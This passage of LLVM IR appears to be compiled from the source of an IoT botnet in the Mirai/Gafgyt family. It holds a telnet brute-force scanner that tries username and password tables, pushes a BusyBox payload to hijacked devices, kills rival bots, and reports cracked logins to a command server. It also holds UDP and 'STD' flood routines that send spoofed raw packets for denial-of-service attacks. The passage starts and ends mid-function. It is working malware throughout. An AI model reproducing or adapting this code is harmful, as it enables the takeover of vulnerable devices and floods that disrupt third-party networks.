  br label %379

; <label>:101:                                    ; preds = %96, %89
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 1)
  br label %379

; <label>:102:                                    ; preds = %57
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %45) #7, !srcloc !7
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %105 = load i32, i32* %104, align 16
  %106 = srem i32 %105, 64
  %107 = zext i32 %106 to i64
  %108 = shl i64 1, %107
  %109 = sdiv i32 %105, 64
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %110
  %112 = load i64, i64* %111, align 8
  %113 = or i64 %108, %112
  store i64 %113, i64* %111, align 8
  store i64 0, i64* %32, align 8
  store i64 %46, i64* %33, align 8
  %114 = load i32, i32* %104, align 16
  %115 = add nsw i32 %114, 1
  %116 = call i32 @select(i32 %115, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #7
  switch i32 %116, label %131 [
    i32 1, label %117
    i32 -1, label %130
  ]

; <label>:117:                                    ; preds = %102
  %118 = call i64 @time(i64* null) #7
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %51, align 16
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %120 = load i32, i32* %104, align 16
  %121 = call i32 @getsockopt(i32 %120, i32 1, i32 4, i8* nonnull %47, i32* nonnull %5) #7
  %122 = load i32, i32* %6, align 4
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %125, label %124

; <label>:124:                                    ; preds = %117
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* %104, align 16
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 3, i8* null) #7
  %128 = and i32 %127, -2049
  %129 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %128) #7
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 2)
  br label %379

; <label>:130:                                    ; preds = %102
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:131:                                    ; preds = %102
  %132 = load i32, i32* %51, align 16
  %133 = add i32 %132, 7
  %134 = zext i32 %133 to i64
  %135 = call i64 @time(i64* null) #7
  %136 = icmp slt i64 %134, %135
  br i1 %136, label %137, label %379

; <label>:137:                                    ; preds = %131
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:138:                                    ; preds = %57
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %140 = load i32, i32* %139, align 16
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @read_until_response(i32 %140, i32 %0, i8* %142, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %153, label %145

; <label>:145:                                    ; preds = %138
  %146 = call i64 @time(i64* null) #7
  %147 = trunc i64 %146 to i32
  store i32 %147, i32* %51, align 16
  %148 = load i8*, i8** %141, align 8
  %149 = call i32 @contains_fail(i8* %148)
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %152, label %151

; <label>:151:                                    ; preds = %145
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:152:                                    ; preds = %145
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 3)
  br label %379

; <label>:153:                                    ; preds = %138
  %154 = load i32, i32* %51, align 16
  %155 = add i32 %154, 7
  %156 = zext i32 %155 to i64
  %157 = call i64 @time(i64* null) #7
  %158 = icmp slt i64 %156, %157
  br i1 %158, label %159, label %379

; <label>:159:                                    ; preds = %153
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:160:                                    ; preds = %57
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %162 = load i32, i32* %161, align 16
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = zext i8 %164 to i64
  %166 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = call i64 @strlen(i8* %167) #14
  %169 = call i64 @send(i32 %162, i8* %167, i64 %168, i32 16384) #7
  %170 = icmp slt i64 %169, 0
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %160
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:172:                                    ; preds = %160
  %173 = load i32, i32* %161, align 16
  %174 = call i64 @send(i32 %173, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i64 0, i64 0), i64 2, i32 16384) #7
  %175 = icmp slt i64 %174, 0
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %172
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:177:                                    ; preds = %172
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 4)
  br label %379

; <label>:178:                                    ; preds = %57
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %180 = load i32, i32* %179, align 16
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @read_until_response(i32 %180, i32 %0, i8* %182, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %184 = icmp eq i32 %183, 0
  br i1 %184, label %193, label %185

; <label>:185:                                    ; preds = %178
  %186 = call i64 @time(i64* null) #7
  %187 = trunc i64 %186 to i32
  store i32 %187, i32* %51, align 16
  %188 = load i8*, i8** %181, align 8
  %189 = call i32 @contains_fail(i8* %188)
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %192, label %191

; <label>:191:                                    ; preds = %185
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:192:                                    ; preds = %185
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 5)
  br label %379

; <label>:193:                                    ; preds = %178
  %194 = load i32, i32* %51, align 16
  %195 = add i32 %194, 7
  %196 = zext i32 %195 to i64
  %197 = call i64 @time(i64* null) #7
  %198 = icmp slt i64 %196, %197
  br i1 %198, label %199, label %379

; <label>:199:                                    ; preds = %193
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:200:                                    ; preds = %57
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %204 = load i8, i8* %203, align 1
  %205 = zext i8 %204 to i64
  %206 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %205
  %207 = load i8*, i8** %206, align 8
  %208 = call i64 @strlen(i8* %207) #14
  %209 = call i64 @send(i32 %202, i8* %207, i64 %208, i32 16384) #7
  %210 = icmp slt i64 %209, 0
  br i1 %210, label %211, label %212

; <label>:211:                                    ; preds = %200
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:212:                                    ; preds = %200
  %213 = load i32, i32* %201, align 16
  %214 = call i64 @send(i32 %213, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i64 0, i64 0), i64 2, i32 16384) #7
  %215 = icmp slt i64 %214, 0
  br i1 %215, label %216, label %217

; <label>:216:                                    ; preds = %212
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:217:                                    ; preds = %212
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 6)
  br label %379

; <label>:218:                                    ; preds = %57
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %220 = load i32, i32* %219, align 16
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %222 = load i8*, i8** %221, align 8
  %223 = call i32 @read_until_response(i32 %220, i32 %0, i8* %222, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %256, label %225

; <label>:225:                                    ; preds = %218
  %226 = call i64 @time(i64* null) #7
  %227 = trunc i64 %226 to i32
  store i32 %227, i32* %51, align 16
  %228 = load i8*, i8** %221, align 8
  %229 = call i32 @contains_fail(i8* %228)
  %230 = icmp eq i32 %229, 0
  br i1 %230, label %232, label %231

; <label>:231:                                    ; preds = %225
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:232:                                    ; preds = %225
  %233 = load i8*, i8** %221, align 8
  %234 = call i32 @contains_success(i8* %233)
  %235 = icmp eq i32 %234, 0
  br i1 %235, label %255, label %236

; <label>:236:                                    ; preds = %232
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %238 = load i8, i8* %237, align 1
  %239 = icmp eq i8 %238, 2
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %236
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %379

; <label>:241:                                    ; preds = %236
  %242 = load i32, i32* @mainCommSock, align 4
  %243 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %245 = load i8, i8* %244, align 2
  %246 = zext i8 %245 to i64
  %247 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i64
  %252 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %251
  %253 = load i8*, i8** %252, align 8
  %254 = call i32 (i32, i8*, ...) @sockprintf(i32 %242, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i64 0, i64 0), i8* %243, i8* %248, i8* %253)
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %379

; <label>:255:                                    ; preds = %232
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:256:                                    ; preds = %218
  %257 = load i32, i32* %51, align 16
  %258 = add i32 %257, 7
  %259 = zext i32 %258 to i64
  %260 = call i64 @time(i64* null) #7
  %261 = icmp slt i64 %259, %260
  br i1 %261, label %262, label %379

; <label>:262:                                    ; preds = %256
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:263:                                    ; preds = %57
  %264 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %34, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i64 0, i64 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i64 0, i64 0)) #7
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %266 = load i32, i32* %265, align 16
  %267 = call i64 @strlen(i8* nonnull %34) #14
  %268 = call i64 @send(i32 %266, i8* nonnull %34, i64 %267, i32 16384) #7
  %269 = icmp slt i64 %268, 0
  br i1 %269, label %270, label %271

; <label>:270:                                    ; preds = %263
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:271:                                    ; preds = %263
  call void @RemoveTempDirs()
  %272 = load i32, i32* @mainCommSock, align 4
  %273 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %275 = load i8, i8* %274, align 2
  %276 = zext i8 %275 to i64
  %277 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %276
  %278 = load i8*, i8** %277, align 8
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i64
  %282 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %281
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 (i32, i8*, ...) @sockprintf(i32 %272, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i64 0, i64 0), i8* %273, i8* %278, i8* %283)
  %285 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %48, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i64 0, i64 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0)) #7
  %286 = load i32, i32* %265, align 16
  %287 = call i64 @strlen(i8* nonnull %48) #14
  %288 = call i64 @send(i32 %286, i8* nonnull %48, i64 %287, i32 16384) #7
  %289 = icmp slt i64 %288, 0
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %271
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:291:                                    ; preds = %271
  %292 = load i32, i32* @mainCommSock, align 4
  %293 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %294 = load i8, i8* %274, align 2
  %295 = zext i8 %294 to i64
  %296 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = load i8, i8* %279, align 1
  %299 = zext i8 %298 to i64
  %300 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 (i32, i8*, ...) @sockprintf(i32 %292, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i64 0, i64 0), i8* %293, i8* %297, i8* %301)
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 8)
  br label %379

; <label>:303:                                    ; preds = %57
  %304 = call i64 @time(i64* null) #7
  %305 = trunc i64 %304 to i32
  store i32 %305, i32* %51, align 16
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = call i64 @send(i32 %307, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i64 0, i64 0), i64 4, i32 16384) #7
  %309 = load i32, i32* %306, align 16
  %310 = call i64 @send(i32 %309, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i64 0, i64 0), i64 7, i32 16384) #7
  %311 = load i32, i32* %306, align 16
  %312 = load i8*, i8** @Busybox_Payload, align 8
  %313 = call i64 @strlen(i8* %312) #14
  %314 = call i64 @send(i32 %311, i8* %312, i64 %313, i32 16384) #7
  %315 = icmp slt i64 %314, 0
  br i1 %315, label %316, label %317

; <label>:316:                                    ; preds = %303
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:317:                                    ; preds = %303
  %318 = load i32, i32* @mainCommSock, align 4
  %319 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %321 = load i8, i8* %320, align 2
  %322 = zext i8 %321 to i64
  %323 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %322
  %324 = load i8*, i8** %323, align 8
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %326 = load i8, i8* %325, align 1
  %327 = zext i8 %326 to i64
  %328 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %327
  %329 = load i8*, i8** %328, align 8
  %330 = call i32 (i32, i8*, ...) @sockprintf(i32 %318, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i64 0, i64 0), i8* %319, i8* %324, i8* %329)
  %331 = load i32, i32* %306, align 16
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %333 = load i8*, i8** %332, align 8
  %334 = call i32 @read_until_response(i32 %331, i32 %0, i8* %333, i32 1024, i8** bitcast ([10 x i8]* @.str.513 to i8**))
  %335 = icmp eq i32 %334, 0
  br i1 %335, label %356, label %336

; <label>:336:                                    ; preds = %317
  %337 = load i8*, i8** %332, align 8
  %338 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %337, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i64 0, i64 0)) #7
  %339 = icmp eq i32 %338, 0
  br i1 %339, label %356, label %340

; <label>:340:                                    ; preds = %336
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %342 = load i8, i8* %341, align 1
  %343 = icmp eq i8 %342, 3
  br i1 %343, label %356, label %344

; <label>:344:                                    ; preds = %340
  %345 = load i32, i32* @mainCommSock, align 4
  %346 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %347 = load i8, i8* %320, align 2
  %348 = zext i8 %347 to i64
  %349 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %348
  %350 = load i8*, i8** %349, align 8
  %351 = load i8, i8* %325, align 1
  %352 = zext i8 %351 to i64
  %353 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %352
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 (i32, i8*, ...) @sockprintf(i32 %345, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i64 0, i64 0), i8* %346, i8* %350, i8* %354)
  br label %356

; <label>:356:                                    ; preds = %340, %336, %317, %344
  %357 = load i32, i32* %51, align 16
  %358 = add i32 %357, 45
  %359 = zext i32 %358 to i64
  %360 = call i64 @time(i64* null) #7
  %361 = icmp slt i64 %359, %360
  br i1 %361, label %362, label %379

; <label>:362:                                    ; preds = %356
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %364 = load i8, i8* %363, align 1
  %365 = icmp eq i8 %364, 3
  br i1 %365, label %378, label %366

; <label>:366:                                    ; preds = %362
  %367 = load i32, i32* @mainCommSock, align 4
  %368 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %369 = load i8, i8* %320, align 2
  %370 = zext i8 %369 to i64
  %371 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %370
  %372 = load i8*, i8** %371, align 8
  %373 = load i8, i8* %325, align 1
  %374 = zext i8 %373 to i64
  %375 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %374
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 (i32, i8*, ...) @sockprintf(i32 %367, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i64 0, i64 0), i8* %368, i8* %372, i8* %376)
  br label %378

; <label>:378:                                    ; preds = %362, %366
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:379:                                    ; preds = %57, %177, %217, %291, %101, %100, %137, %131, %159, %153, %199, %193, %262, %256, %378, %356, %231, %240, %241, %255, %191, %192, %151, %152, %124, %125, %83, %316, %290, %270, %216, %211, %176, %171, %130, %82
  %380 = add nsw i32 %.1125, 1
  %381 = icmp slt i32 %380, %.
  %brmerge = or i1 %381, %30
  %.mux = select i1 %381, i32 %380, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %379
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @SendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %6 = tail call i64 @time(i64* null) #7
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #7
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %40, %3
  %.0 = phi i32 [ 0, %3 ], [ %41, %40 ]
  %27 = call i32 @rand() #7
  %28 = icmp ugt i32 %.0, 49
  br i1 %28, label %29, label %40

; <label>:29:                                     ; preds = %26
  %30 = sext i32 %27 to i64
  %31 = urem i64 %30, 24
  %32 = getelementptr inbounds [24 x i8*], [24 x i8*]* @SendSTD.randstrings, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @send(i32 %5, i8* %33, i64 69, i32 0) #7
  %35 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #7
  %36 = call i64 @time(i64* null) #7
  %37 = icmp slt i64 %36, %25
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %29
  %39 = call i32 @close(i32 %5) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:40:                                     ; preds = %29, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %29 ]
  %41 = add i32 %.1, 1
  br label %26
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #12

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #2 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %118

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %118, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #7
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %118, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i64 @time(i64* null) #7
  %33 = call i32 @rand_cmwc()
  %34 = zext i32 %33 to i64
  %35 = xor i64 %34, %32
  %36 = trunc i64 %35 to i32
  call void @srand(i32 %36) #7
  %37 = call i32 @rand() #7
  call void @init_rand(i32 %37)
  %38 = icmp eq i32 %31, 0
  br i1 %38, label %39, label %.preheader

; <label>:39:                                     ; preds = %.preheader
  %40 = sub nsw i32 32, %5
  %41 = shl i32 -1, %40
  %42 = sext i32 %3 to i64
  %43 = add nsw i64 %42, 28
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @getRandomIP(i32 %41)
  %51 = call i32 @htonl(i32 %50) #15
  %52 = add nsw i64 %42, 8
  %53 = trunc i64 %52 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %49, i32 %51, i8 zeroext 17, i32 %53)
  %54 = trunc i64 %52 to i16
  %55 = call zeroext i16 @htons(i16 zeroext %54) #15
  %56 = getelementptr inbounds i8, i8* %45, i64 24
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 8
  %58 = call i32 @rand_cmwc()
  %59 = trunc i32 %58 to i16
  %60 = bitcast i8* %47 to i16*
  store i16 %59, i16* %60, align 4
  br i1 %10, label %61, label %63

; <label>:61:                                     ; preds = %39
  %62 = call i32 @rand_cmwc()
  br label %67

; <label>:63:                                     ; preds = %39
  %64 = trunc i32 %1 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #15
  %66 = zext i16 %65 to i32
  br label %67

; <label>:67:                                     ; preds = %63, %61
  %68 = phi i32 [ %62, %61 ], [ %66, %63 ]
  %69 = trunc i32 %68 to i16
  %70 = getelementptr inbounds i8, i8* %45, i64 22
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 0, i16* %73, align 2
  %74 = getelementptr inbounds i8, i8* %45, i64 28
  call void @makeRandomStr(i8* %74, i32 %3)
  %75 = bitcast i8* %45 to i16*
  %76 = getelementptr inbounds i8, i8* %45, i64 2
  %77 = bitcast i8* %76 to i16*
  %78 = load i16, i16* %77, align 2
  %79 = zext i16 %78 to i32
  %80 = call zeroext i16 @csum(i16* nonnull %75, i32 %79)
  %81 = getelementptr inbounds i8, i8* %45, i64 10
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 2
  %83 = call i64 @time(i64* null) #7
  %84 = zext i32 %2 to i64
  %85 = add i64 %83, %84
  %86 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %87 = getelementptr inbounds i8, i8* %45, i64 4
  %88 = bitcast i8* %87 to i16*
  %89 = getelementptr inbounds i8, i8* %45, i64 12
  %90 = bitcast i8* %89 to i32*
  %sext = shl i64 %85, 32
  %91 = ashr exact i64 %sext, 32
  %92 = trunc i32 %1 to i16
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %67
  %.0 = phi i32 [ 0, %67 ], [ %.0.be, %.backedge.backedge ]
  %93 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  store i16 %95, i16* %60, align 4
  br i1 %10, label %96, label %98

; <label>:96:                                     ; preds = %.backedge
  %97 = call i32 @rand_cmwc()
  br label %101

; <label>:98:                                     ; preds = %.backedge
  %99 = call zeroext i16 @htons(i16 zeroext %92) #15
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %98, %96
  %102 = phi i32 [ %97, %96 ], [ %100, %98 ]
  %103 = trunc i32 %102 to i16
  store i16 %103, i16* %71, align 2
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  store i16 %105, i16* %88, align 4
  %106 = call i32 @getRandomIP(i32 %41)
  %107 = call i32 @htonl(i32 %106) #15
  store i32 %107, i32* %90, align 4
  %108 = load i16, i16* %77, align 2
  %109 = zext i16 %108 to i32
  %110 = call zeroext i16 @csum(i16* nonnull %75, i32 %109)
  store i16 %110, i16* %82, align 2
  %111 = icmp eq i32 %.0, %4
  br i1 %111, label %112, label %115

; <label>:112:                                    ; preds = %101
  %113 = call i64 @time(i64* null) #7
  %114 = icmp sgt i64 %113, %91
  br i1 %114, label %117, label %.backedge.backedge

; <label>:115:                                    ; preds = %101
